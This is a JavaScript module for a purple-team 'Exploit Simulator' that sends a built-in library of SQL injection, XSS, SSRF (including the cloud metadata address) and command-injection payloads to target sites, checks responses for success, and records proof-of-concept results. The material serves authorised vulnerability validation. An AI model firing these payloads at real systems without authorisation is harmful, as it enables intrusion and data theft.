/**
 * Exploit Simulator - Purple Team Automation
 * Simulates real attacks to validate vulnerabilities
 */

const axios = require('axios');
const { SecureHttpClient } = require('../utils/secure-http-client');
const { logger } = require('../utils/error-handler');
const db = require('../config/database');

class ExploitSimulator {
  constructor() {
    this.httpClient = new SecureHttpClient({ timeout: 15000, maxContentLength: 10 * 1024 * 1024 });
    this.exploits = this.loadExploitLibrary();
    this.safeMode = true; // Never cause damage
  }

  loadExploitLibrary() {
    return {
      sql_injection: {
        payloads: [
          {id: 'sql_auth_bypass', payload: "admin' OR '1'='1' --", target: 'login', risk: 'safe'},
          {id: 'sql_union', payload: "' UNION SELECT NULL,NULL,NULL--", target: 'search', risk: 'safe'},
          {id: 'sql_time_blind', payload: "1' AND SLEEP(5)--", target: 'id_param', risk: 'safe'}
        ],
        success_indicators: ['Welcome', 'Dashboard', 'delay > 4s', 'SQL error']
      },
      xss: {
        payloads: [
          {id: 'xss_reflected', payload: '<script>console.log("XSS")</script>', target: 'search', risk: 'safe'},
          {id: 'xss_img', payload: '<img src=x onerror=alert(1)>', target: 'comment', risk: 'safe'},
          {id: 'xss_event', payload: '<input autofocus onfocus=alert(1)>', target: 'form', risk: 'safe'}
        ],
        success_indicators: ['<script', 'onerror', 'onfocus', 'alert']
      },
      ssrf: {
        payloads: [
          {id: 'ssrf_metadata', payload: 'http://169.254.169.254/latest/meta-data/', target: 'url_param', risk: 'safe'},
          {id: 'ssrf_internal', payload: 'http://localhost:8080/admin', target: 'fetch', risk: 'safe'}
        ],
        success_indicators: ['ami-id', 'instance-id', 'admin panel']
      },
      command_injection: {
        payloads: [
          {id: 'cmd_test', payload: '; echo "test123"', target: 'file_param', risk: 'safe'},
          {id: 'cmd_id', payload: '`id`', target: 'command', risk: 'safe'}
        ],
        success_indicators: ['test123', 'uid=', 'gid=']
      }
    };
  }

  async simulateExploit(vulnerability, domain) {
    const simulation = {
      vulnerability_id: vulnerability.id,
      domain_id: domain.id,
      exploit_type: vulnerability.category,
      started_at: new Date(),
      attempts: [],
      success: false,
      proof_of_concept: null,
      risk_confirmed: false,
      safe_mode: this.safeMode
    };

    console.log(`ðŸŽ¯ Simulating ${vulnerability.category} exploit for ${domain.url}`);

    const exploitData = this.exploits[vulnerability.category];
    if (!exploitData) {
      simulation.status = 'no_exploit_available';
      return simulation;
    }

    // Try each payload
    for (const payload of exploitData.payloads) {
      if (payload.risk !== 'safe' && this.safeMode) {
        continue; // Skip dangerous payloads in safe mode
      }

      const attempt = await this.attemptExploit(domain, payload, exploitData.success_indicators);
      simulation.attempts.push(attempt);

      if (attempt.success) {
        simulation.success = true;
        simulation.proof_of_concept = this.generatePoC(vulnerability, payload, attempt);
        simulation.risk_confirmed = true;
        break; // Stop on first success
      }
    }

    simulation.completed_at = new Date();
    simulation.duration_ms = simulation.completed_at - simulation.started_at;

    // Save simulation results
    this.saveSimulation(simulation);

    return simulation;
  }

  async attemptExploit(domain, payload, successIndicators) {
    const attempt = {
      payload_id: payload.id,
      payload: payload.payload,
      target: payload.target,
      timestamp: new Date(),
      success: false,
      response: null,
      indicators_matched: []
    };

    try {
      const targetUrl = this.constructTargetUrl(domain.url, payload.target, payload.payload);
      const startTime = Date.now();

      const response = await this.httpClient.get(targetUrl, {
        timeout: 10000,
        validateStatus: () => true,
        maxRedirects: 0
      });

      attempt.response_time = Date.now() - startTime;
      attempt.status_code = response.status;
      attempt.response = response.data?.substring(0, 1000); // First 1KB

      // Check success indicators
      successIndicators.forEach(indicator => {
        if (indicator.includes('delay') && attempt.response_time > 4000) {
          attempt.indicators_matched.push('time_delay');
          attempt.success = true;
        } else if (attempt.response?.includes(indicator)) {
          attempt.indicators_matched.push(indicator);
          attempt.success = true;
        }
      });

    } catch (error) {
      attempt.error = error.message;
    }

    return attempt;
  }

  constructTargetUrl(baseUrl, target, payload) {
    const url = new URL(baseUrl);

    switch (target) {
      case 'login':
        url.pathname = '/login';
        url.searchParams.set('username', payload);
        url.searchParams.set('password', 'test');
        break;
      case 'search':
        url.pathname = '/search';
        url.searchParams.set('q', payload);
        break;
      case 'id_param':
        url.pathname = '/view';
        url.searchParams.set('id', payload);
        break;
      case 'url_param':
        url.pathname = '/fetch';
        url.searchParams.set('url', payload);
        break;
      case 'file_param':
        url.pathname = '/file';
        url.searchParams.set('name', payload);
        break;
      default:
        url.searchParams.set('test', payload);
    }

    return url.toString();
  }

  generatePoC(vulnerability, payload, attempt) {
    return {
      vulnerability_title: vulnerability.title,
      exploit_steps: [
        {step: 1, action: 'Navigate to target URL', url: attempt.target_url},
        {step: 2, action: 'Inject payload', payload: payload.payload},
        {step: 3, action: 'Observe response', indicators: attempt.indicators_matched}
      ],
      curl_command: this.generateCurlCommand(attempt),
      impact: `Successfully exploited ${vulnerability.category}: ${attempt.indicators_matched.join(', ')}`,
      remediation: vulnerability.remediation_text,
      cvss_exploitation_confirmed: true
    };
  }

  generateCurlCommand(attempt) {
    return `curl -X GET "${attempt.target_url || 'TARGET_URL'}" -H "User-Agent: NEXUS-Exploit-Simulator"`;
  }

  saveSimulation(simulation) {
    try {
      db.prepare(`
        INSERT INTO purple_team_simulations 
        (vulnerability_id, domain_id, exploit_type, success, proof_of_concept, duration_ms, started_at, completed_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      `).run(
        simulation.vulnerability_id,
        simulation.domain_id,
        simulation.exploit_type,
        simulation.success ? 1 : 0,
        JSON.stringify(simulation.proof_of_concept),
        simulation.duration_ms,
        simulation.started_at.toISOString(),
        simulation.completed_at.toISOString()
      );
    } catch (error) {
      console.error('Failed to save simulation:', error.message);
    }
  }

  async runPurpleTeamExercise(domainId) {
    console.log('ðŸŽ­ Starting Purple Team Exercise...');

    const vulnerabilities = db.prepare(`
      SELECT * FROM vulnerabilities 
      WHERE domain_id = ? AND status = 'open' AND severity IN ('critical', 'high')
      LIMIT 10
    `).all(domainId);

    const domain = db.prepare('SELECT * FROM domains WHERE id = ?').get(domainId);

    const results = {
      total_vulnerabilities: vulnerabilities.length,
      exploits_attempted: 0,
      exploits_successful: 0,
      simulations: []
    };

    for (const vuln of vulnerabilities) {
      const simulation = await this.simulateExploit(vuln, domain);
      results.simulations.push(simulation);
      results.exploits_attempted++;
      
      if (simulation.success) {
        results.exploits_successful++;
      }

      // Rate limiting between attempts
      await this.sleep(2000);
    }

    results.success_rate = results.exploits_attempted > 0 
      ? Math.round((results.exploits_successful / results.exploits_attempted) * 100) 
      : 0;

    console.log(`âœ… Purple Team Exercise completed: ${results.exploits_successful}/${results.exploits_attempted} successful`);

    return results;
  }

  async generateAttackScenario(vulnerabilities) {
    // Create realistic multi-stage attack scenario
    const scenario = {
      name: 'Automated Attack Chain Simulation',
      stages: [],
      total_risk_score: 0,
      estimated_time: 0
    };

    // Stage 1: Reconnaissance
    scenario.stages.push({
      stage: 1,
      name: 'Reconnaissance',
      techniques: ['Port scanning', 'Service enumeration', 'Technology fingerprinting'],
      duration_minutes: 15,
      difficulty: 'trivial'
    });

    // Stage 2: Initial Access
    const authVulns = vulnerabilities.filter(v => 
      v.category === 'authentication' || v.category === 'injection'
    );

    if (authVulns.length > 0) {
      scenario.stages.push({
        stage: 2,
        name: 'Initial Access',
        vulnerability: authVulns[0].title,
        technique: authVulns[0].category === 'injection' ? 'SQL Injection' : 'Brute Force',
        duration_minutes: 30,
        difficulty: 'medium',
        risk_score: authVulns[0].cvss_score || 7.0
      });
    }

    // Stage 3: Privilege Escalation
    const privescVulns = vulnerabilities.filter(v => v.category === 'access_control');
    if (privescVulns.length > 0) {
      scenario.stages.push({
        stage: 3,
        name: 'Privilege Escalation',
        vulnerability: privescVulns[0].title,
        technique: 'Access Control Bypass',
        duration_minutes: 45,
        difficulty: 'hard',
        risk_score: privescVulns[0].cvss_score || 8.0
      });
    }

    // Stage 4: Data Exfiltration
    scenario.stages.push({
      stage: 4,
      name: 'Data Exfiltration',
      technique: 'Database dump via SQLi',
      duration_minutes: 60,
      difficulty: 'medium',
      risk_score: 9.0
    });

    scenario.total_risk_score = scenario.stages.reduce((sum, s) => sum + (s.risk_score || 0), 0);
    scenario.estimated_time = scenario.stages.reduce((sum, s) => sum + s.duration_minutes, 0);

    return scenario;
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = new ExploitSimulator();
